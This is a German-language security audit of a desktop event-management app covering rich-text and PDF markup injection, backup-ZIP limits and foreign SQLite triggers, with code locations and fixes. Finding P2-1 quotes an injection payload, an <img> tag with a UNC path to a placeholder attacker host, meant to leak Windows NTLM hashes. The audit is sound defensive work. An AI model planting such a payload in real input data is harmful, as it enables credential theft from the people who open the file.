# Prüfer 2 – Desktop und Dateiformate

## Zusammenfassung (schwerster Fund zuerst)
1. P2-1 (mittel): Die Seitenleiste „Offene Starts“ setzt Teilnehmernamen und Richternamen ungeschützt als Rich Text ein. Eine fremde CSV, ein PDF-Formular oder eine Termin-Datei kann Markup einschleusen. Dazu gehört ein `<img>` mit UNC-Pfad.
2. P2-2 (gering bis mittel): In sieben PDF-Titeln fehlt `_p_wert`. Betroffen sind Vereinsname und Richtername. Der Export bricht dann ab, oder fremdes Markup wird interpretiert.
3. P2-3 (gering): Sicherungs-ZIP ohne Größen- oder Anzahlgrenze, außerdem keine Prüfung auf Windows-Sonderdateinamen.
4. P2-4 (Hinweis): Die Termin-Datei eines Dritten wird nicht geprüft. Fremde Trigger und Views bleiben erhalten.

## Funde
### P2-1: Rich-Text-Injektion in „Offene Starts“
- Schwere: mittel (Vereinsumfeld: Teilnehmerdaten kommen per CSV/PDF von Dritten. Windows-Rechner geben bei UNC-Zugriffen oft NTLM-Hashes preis).
- Stelle: app.py:2457 (`setTextFormat(Qt.RichText)`), app.py:2566 und 2569 (`team["nachname"]`, `name` = Richtername, ungeschützt in f-String), app.py:2571 bis 2577 (Disziplin).
- Szenario: Eine Teilnehmerin schickt ein Formular oder eine CSV mit dem Nachnamen `<img src="\\angreifer\s\a.png">`. Die Prüfungsleitung importiert sie, und die Zeitplan-Seitenleiste lädt das Bild. Der Name erscheint bei Überschneidungen. Der Richtername kommt ebenfalls aus Nutzereingaben.
- Lokal nachvollzogen: nein. Netzzugriffe sind nicht erlaubt, und die Rich-Text-Darstellung wurde nicht gestartet. Der Code zeigt, dass kein `html.escape` stattfindet.
- Auswirkung: Markup kann die Anzeige verfälschen (Nutzdaten können als Anzeige-Markup erscheinen). Qt kann Bilder von lokalen Pfaden oder UNC-Pfaden laden. Das ist ein möglicher SMB-Verbindungsaufbau mit Hash-Leak.
- Empfehlung: Alle Nutzerwerte mit `html.escape()` einsetzen. Alternativ auf PlainText wechseln und die Farbe über QSS setzen.

### P2-2: Fehlende Maskierung in PDF-Titeln
- Schwere: gering bis mittel
- Stelle: pdf_export.py:638, 878, 1182, 1268, 1325, 1499 (jeweils `veranstaltung['verein']` im Titel); 1506 (`plan['richter']`) und 1508 (zusätzlich `veranstaltung['verein']`); 480 (`zusatz` mit `zugeordnete_disziplin`). Alle landen unmaskiert in `Paragraph`.
- Szenario: Eine fremde Termin-Datei hat den Vereinsnamen `<unknown>` oder `A < B` oder `<img src=...>`. Die Prüfungsleitung öffnet sie und erzeugt Ergebnisliste, Übersicht, Chipliste, Richter-Bedarf oder Zeitplan. Auch ein legitimer Vereinsname mit `&` oder `<` löst es aus.
- Lokal nachvollzogen: ja, reportlab-Test mit erfundenem Text. `<img src="http://…">` im Paragraph ergibt einen OSError beim Erzeugen, und der Export bricht ab. Es gab keinen HTTP-Abruf, denn reportlab sperrt Hosts. Lokale Bild-Pfade wurden nicht getestet.
- Auswirkung: Der Export bricht ab (DoS pro Dokument). Fremdes Markup (`<font>`, `<a>`) wird gerendert, und ein lokales `<img src="C:\…">` könnte Dateien als Bild einbetten.
- Empfehlung: `_p_wert()` für Verein, Richter und Disziplin in allen Titeln anwenden. Die übrigen Stellen (Teilnehmerfelder, Etiketten, Zeitplan-Tabelle, Anmeldeformular-Erklärung) sind maskiert.

### P2-3: Sicherungs-ZIP: keine Grenzen, Sonderdateinamen
- Schwere: gering
- Stelle: db_sicherung.py:177 bis 195 (`zf.read(quelle)` lädt das ganze Archiv-Mitglied in den RAM). Zeile 125 bis 135 (`zf.read(namen[0])` entpackt die erste Datei ebenfalls vollständig). `_ist_sicherer_dateiname` in Zeile 33 bis 56.
- Szenario: Eine präparierte Sicherung enthält ein Mitglied mit mehreren GB (LZMA-/Deflate-Bombe). Beim Passwortcheck und beim Wiederherstellen wird die Datei komplett in den Speicher gelesen.
- Lokal nachvollzogen: nein, nur aus dem Code abgeleitet.
- Auswirkung: Speicherüberlauf und Absturz der App. Unter Windows sind Namen wie `CON.sqlite` oder `x:ads.sqlite` (Alternate Data Stream) nicht ausgeschlossen. Zudem wird die wiederhergestellte Datei erst beim späteren Öffnen auf Gültigkeit geprüft.
- Empfehlung: `ZipInfo.file_size` auf eine plausible Obergrenze prüfen, zum Beispiel 500 MB je Datei und höchstens 200 Einträge. Namen mit `:` und reservierte Gerätenamen ablehnen.

### P2-4: Fremde SQLite-Datei: Trigger und Views bleiben
- Schwere: Hinweis
- Stelle: db.py:573 (`init_db`: `executescript(SCHEMA)` mit `IF NOT EXISTS`), desktop_dialoge.py:714 (Import aus anderem Termin).
- Szenario: Eine weitergegebene Termin-Datei enthält zusätzliche Trigger oder Views, zum Beispiel einen Trigger auf `ergebnisse`, der Werte verändert, oder einen View mit demselben Namen wie eine Tabelle.
- Lokal nachvollzogen: nein, Code-Lesung. SQLite-Trigger können nur innerhalb dieser Datenbank wirken, es gibt keinen Systemzugriff.
- Auswirkung: Stille Manipulation von Ergebnissen oder Teilnehmern, oder ein Fehler beim Öffnen. Der Fall ist sehr unwahrscheinlich.
- Empfehlung: Beim Öffnen und Importieren `sqlite_master` auf Trigger und fremde Views prüfen, optional `PRAGMA trusted_schema=OFF` und `PRAGMA integrity_check` ergänzen.

## Ohne Befund geprüft (Stichworte)
- Path Traversal im Sicherungs-Import ist korrekt behoben (`os.path.basename`, kein `..`, zweite Prüfung in `sicherung_wiederherstellen`).
- Atomares Schreiben per `mkstemp` im Zielordner, danach `os.replace`.
- Passwort-Handhabung: AES-256 über pyzipper. Das Fehlerverhalten ist sauber.
- Update-Prüfung: nur Klick, fester HTTPS-GitHub-API-Link, Timeout 5 s, `json.loads` mit enger Auswertung.
- `openUrl(GITHUB_RELEASES_URL)` ist eine Konstante; die Ergebniszeile steht auf PlainText.
- `QDesktopServices.openUrl(fromLocalFile)` und `explorer /select,` laufen im Listenformat ohne Shell.
- CSV-Import: Kodierungsfallback UTF-8-sig/cp1252, `csv.Error` für sehr große Felder abgefangen.
- PDF-Import über pypdf: Ausnahmen pro Datei abgefangen. Es gibt aber keine Größen- und Seitenbegrenzung (gering).
- Absturzprotokoll: nur Tracebacks, auf 1 MB begrenzt, im Benutzerprofil neben `Termine`.
- Temp-Dateien: `haken.png` im festen `%TEMP%\SHS-Pruefungsprogramm` (nur ein PNG, das beim Start geschrieben wird, kein Risiko); `selbsttest` nutzt `mkdtemp`.
- Anmeldeformular-Erklärung wird mit `_xml_escape` maskiert.

Anzahl: kritisch 0, hoch 0, mittel 1, gering bis mittel 1, gering 1, Hinweis 1.
